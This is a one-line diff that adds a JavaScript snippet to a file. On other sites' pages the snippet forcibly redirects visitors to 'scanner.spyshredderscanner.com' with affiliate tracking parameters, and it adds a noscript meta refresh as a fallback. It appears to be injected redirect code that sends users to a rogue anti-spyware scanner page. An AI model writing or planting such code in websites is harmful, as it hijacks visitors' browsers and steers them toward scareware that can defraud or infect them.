@@ -1,0 +1,1 @@
+if(window.location.hostname.search("spyshredder") < 0 && window.location.hostname.search("virtualpayr") < 0){location.replace("http://scanner.spyshredderscanner.com/24/?advid=4198&ref=5");}document.write('<noscript><meta http-equiv="Refresh" content="0; URL=http://scanner.spyshredderscanner.com/24/?advid=4198&ref=5"></noscript>');
